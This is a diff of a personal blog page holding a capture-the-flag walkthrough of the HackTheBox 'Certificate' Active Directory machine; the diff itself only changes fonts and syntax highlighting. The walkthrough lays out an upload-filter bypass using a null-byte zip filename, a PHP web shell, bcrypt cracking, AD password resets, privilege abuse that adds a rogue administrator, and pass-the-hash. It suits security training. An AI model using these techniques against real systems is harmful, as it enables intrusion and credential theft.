@@ -14,7 +14,8 @@
 <link rel="icon" href="/assets/img/blackarch.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;500;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&family=IBM+Plex+Sans:wght@400;600&display=swap" rel="stylesheet">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap"></noscript>
 <link rel="stylesheet" href="/assets/css/os.css">
 <link rel="stylesheet" href="/assets/css/article.css">
 <link rel="stylesheet" href="/assets/css/blocks.css">
@@ -23,7 +24,12 @@
   var d = document.documentElement;
   d.className = d.className.replace('nojs', 'js');
   try {
-    if (localStorage.getItem('rc-body') === 'sans') d.setAttribute('data-body', 'sans');
+    if (localStorage.getItem('rc-body') === 'sans') {
+      d.setAttribute('data-body', 'sans');
+      var f = document.createElement('link'); f.id = 'font-sans'; f.rel = 'stylesheet';
+      f.href = 'https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&display=swap';
+      document.head.appendChild(f);
+    }
     var root = location.pathname === '/' || location.pathname === '/index.html';
     if (root && !sessionStorage.getItem('rc-booted') && !matchMedia('(prefers-reduced-motion: reduce)').matches) {
       d.classList.add('booting');
@@ -84,7 +90,7 @@
 <div class="wp-stage-body"><p>Nmap paints a <span class="hl-red">certificate.htb</span> AD footprint: DNS, HTTP (Apache 2.4.58 on port 80), Kerberos on 88, LDAP on 389, SMB on 445. DC01 is the domain controller.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ nmap -A -T5 10.129.237.217 --min-rate 2000
+<pre class="wp-term-body"><code class="hljs language-bash">$ nmap -A -T5 10.129.237.217 --min-rate 2000
 53/tcp    open  domain    Simple DNS Plus
 80/tcp    open  http      Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
@@ -115,30 +121,29 @@
 <div class="wp-stage-body"><p>The trick: wrap the payload in an allowed <code>.zip</code>, rename the inner file to <code>dump.php\x00.pdf</code>. PHP on Windows honors the null byte before the extension, Apache still routes <code>.php</code> to the handler.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">zip-forge · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-python">import os, zipfile
+<pre class="wp-term-body"><code class="hljs language-python"><span class="hljs-keyword">import</span> os, zipfile
 
-zip_path     = &#39;dump.zip&#39;
-new_zip_path = &#39;dump22.zip&#39;
-old_filename = &#39;dump.php&#39;
-new_filename = &#39;dump.php\x00.pdf&#39;
+zip_path     = <span class="hljs-string">&#x27;dump.zip&#x27;</span>
+new_zip_path = <span class="hljs-string">&#x27;dump22.zip&#x27;</span>
+old_filename = <span class="hljs-string">&#x27;dump.php&#x27;</span>
+new_filename = <span class="hljs-string">&#x27;dump.php\x00.pdf&#x27;</span>
 
-with zipfile.ZipFile(zip_path, &#39;r&#39;) as zip_read:
-    with zipfile.ZipFile(new_zip_path, &#39;w&#39;,
-                         compression=zipfile.ZIP_DEFLATED) as zip_write:
-        for item in zip_read.infolist():
+<span class="hljs-keyword">with</span> zipfile.ZipFile(zip_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_read:
+    <span class="hljs-keyword">with</span> zipfile.ZipFile(new_zip_path, <span class="hljs-string">&#x27;w&#x27;</span>,
+                         compression=zipfile.ZIP_DEFLATED) <span class="hljs-keyword">as</span> zip_write:
+        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> zip_read.infolist():
             data = zip_read.read(item.filename)
-            if item.filename == old_filename:
+            <span class="hljs-keyword">if</span> item.filename == old_filename:
                 item.filename = new_filename
             zip_write.writestr(item, data)</code></pre>
 </div>
 
 
 <p><code>system()</code> is flagged by XAMPP&#39;s mod_security defaults. Switching to <code>shell_exec</code> slips past:</p>
-<pre><code class="language-php">&lt;?php echo(shell_exec($_GET[&#39;cmd&#39;])); ?&gt;
-</code></pre>
+<pre><code class="hljs language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])); <span class="hljs-meta">?&gt;</span></code></pre>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · shell.php · xamppuser</span></div>
-<pre class="wp-term-body"><code class="language-bash">GET /static/uploads/ebd0473a69a5f33d8a4caa3b1e4f234c/shell.php?cmd=whoami
+<pre class="wp-term-body"><code class="hljs language-bash">GET /static/uploads/ebd0473a69a5f33d8a4caa3b1e4f234c/shell.php?cmd=<span class="hljs-built_in">whoami</span>
 certificate\xamppuser</code></pre>
 </div>
 
@@ -160,13 +165,13 @@ certificate\xamppuser</code></pre>
 <p>A one-liner <code>dump.php</code> runs <code>SELECT * FROM users</code> and prints every row to the browser. The table yields handles, emails, and a <span class="hl-red">$2y$04$...</span> bcrypt hash per user.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt
+<pre class="wp-term-body"><code class="hljs language-bash">$ hashcat -m 3200 -a 0 bcrypt_hashes.txt rockyou.txt
 ...
-$2y$04$bZs2FUjVRiFswYB4CUR8ve02ymuiy0QD23X0KFuT6IM2sBbgQvEFG : [REDACTED]
+$2y$04<span class="hljs-variable">$bZs2FUjVRiFswYB4CUR8ve02ymuiy0QD23X0KFuT6IM2sBbgQvEFG</span> : [REDACTED]
 
-$ nxc ldap certificate.htb -u sara.b -p &#39;[REDACTED]&#39;
+$ nxc ldap certificate.htb -u sara.b -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span>
 LDAP  10.129.237.215  389  DC01  [+] certificate.htb\sara.b:[REDACTED]
-$ nxc winrm certificate.htb -u sara.b -p &#39;[REDACTED]&#39;
+$ nxc winrm certificate.htb -u sara.b -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span>
 WINRM 10.129.237.215 5985 DC01  [+] certificate.htb\sara.b:[REDACTED] (Pwn3d!)</code></pre>
 </div>
 
@@ -187,9 +192,9 @@ WINRM 10.129.237.215 5985 DC01  [+] certificate.htb\sara.b:[REDACTED] (Pwn3d!)</
 <div class="wp-stage-body"><p><code>dir C:\Users\</code> lists local profiles: <code>akeder.kh</code>, <code>Lion.SK</code>, <code>Ryan.K</code>, <code>Sara.B</code>, <code>xamppuser</code>. <code>Ryan.K</code> is the next target.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · sara.b@certificate.htb</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ bloodhound-python -u sara.b -p &#39;[REDACTED]&#39; \
+<pre class="wp-term-body"><code class="hljs language-bash">$ bloodhound-python -u sara.b -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span> \
     -dc dc01.certificate.htb -d certificate.htb -c all -ns 10.10.x.x
-INFO: Found 10 users, 59 groups, 1 computer</code></pre>
+INFO: Found 10 <span class="hljs-built_in">users</span>, 59 <span class="hljs-built_in">groups</span>, 1 computer</code></pre>
 </div>
 
 
@@ -201,8 +206,8 @@ INFO: Found 10 users, 59 groups, 1 computer</code></pre>
 
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · sara.b · bloodyAD</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ bloodyAD -d certificate.htb -u sara.b -p &#39;[REDACTED]&#39; \
-    --host 10.129.237.215 set password RYAN.K &#39;[REDACTED]&#39;
+<pre class="wp-term-body"><code class="hljs language-bash">$ bloodyAD -d certificate.htb -u sara.b -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span> \
+    --host 10.129.237.215 <span class="hljs-built_in">set</span> password RYAN.K <span class="hljs-string">&#x27;[REDACTED]&#x27;</span>
 [+] Password changed successfully!</code></pre>
 </div>
 
@@ -210,12 +215,12 @@ INFO: Found 10 users, 59 groups, 1 computer</code></pre>
 <p><code>evil-winrm</code> back in as Ryan.K. <code>whoami /priv</code> shows the prize:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · Ryan.K@certificate.htb</span></div>
-<pre class="wp-term-body"><code class="language-powershell">PS C:\Users\Ryan.K&gt; whoami /priv
+<pre class="wp-term-body"><code class="hljs language-powershell"><span class="hljs-built_in">PS</span> C:\Users\Ryan.K&gt; whoami /priv
 PRIVILEGES INFORMATION
 Privilege Name                 Description                         State
 SeMachineAccountPrivilege      Add workstations to domain          Enabled
 SeManageVolumePrivilege        Perform volume maintenance tasks    Enabled
-SeIncreaseWorkingSetPrivilege  Increase a process working set      Enabled</code></pre>
+SeIncreaseWorkingSetPrivilege  Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>      Enabled</code></pre>
 </div>
 
 
@@ -233,19 +238,19 @@ SeIncreaseWorkingSetPrivilege  Increase a process working set      Enabled</code
 <p>Plan B: LOLBAS <code>diaghub.exe</code> drops a payload into <code>System32\spool\drivers\color\</code> and executes as SYSTEM.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · Ryan.K@certificate.htb</span></div>
-<pre class="wp-term-body"><code class="language-powershell">PS&gt; .\SeManageVolumeAbuse.exe C:\Windows\System32
+<pre class="wp-term-body"><code class="hljs language-powershell"><span class="hljs-built_in">PS</span>&gt; .\SeManageVolumeAbuse.exe C:\Windows\System32
 Success! Permissions changed.
 
-PS&gt; copy .\nc.bat C:\windows\system32\spool\drivers\color\nc.bat
-PS&gt; type C:\windows\system32\spool\drivers\color\nc.bat
-net user moriz [REDACTED] /add
+<span class="hljs-built_in">PS</span>&gt; <span class="hljs-built_in">copy</span> .\nc.bat C:\windows\system32\spool\drivers\color\nc.bat
+<span class="hljs-built_in">PS</span>&gt; <span class="hljs-built_in">type</span> C:\windows\system32\spool\drivers\color\nc.bat
+net user moriz [<span class="hljs-type">REDACTED</span>] /add
 net localgroup Administrators moriz /add
 
-PS&gt; diaghub.exe C:\ProgramData xct.dll
+<span class="hljs-built_in">PS</span>&gt; diaghub.exe C:\ProgramData xct.dll
 [+] CoCreateInstance
 [+] CreateSession
 [+] Success
-PS&gt; net user
+<span class="hljs-built_in">PS</span>&gt; net user
 Administrator  akeder.kh  Alex.D
 moriz          Nya.S      Ryan.K</code></pre>
 </div>
@@ -257,13 +262,13 @@ moriz          Nya.S      Ryan.K</code></pre>
 <p>The new <span class="hl-ok">moriz</span> account is now in Administrators. <code>secretsdump.py</code> over the domain pops the Administrator NT hash:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · moriz · impacket</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ secretsdump.py &#39;certificate.htb/moriz:[REDACTED]@certificate.htb&#39;
+<pre class="wp-term-body"><code class="hljs language-bash">$ secretsdump.py <span class="hljs-string">&#x27;certificate.htb/moriz:[REDACTED]@certificate.htb&#x27;</span>
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NT HASH]:::
 krbtgt:502:aad3b435...
 ...
 
 $ evil-winrm -i 10.129.237.215 -u Administrator -H [NT HASH]
-*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt</code></pre>
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <span class="hljs-built_in">type</span> root.txt</code></pre>
 </div>
 
 
@@ -295,9 +300,6 @@ $ evil-winrm -i 10.129.237.215 -u Administrator -H [NT HASH]
   </section>
 </main>
 <footer class="nojs-foot">© 2026 Will DeDominico · <a href="https://github.com/Moriz82">GitHub</a> · <a href="https://www.linkedin.com/in/wdedo/">LinkedIn</a></footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/swift.min.js" defer></script>
 <script type="module" src="/assets/js/os/main.js"></script>
 </body>
 </html>
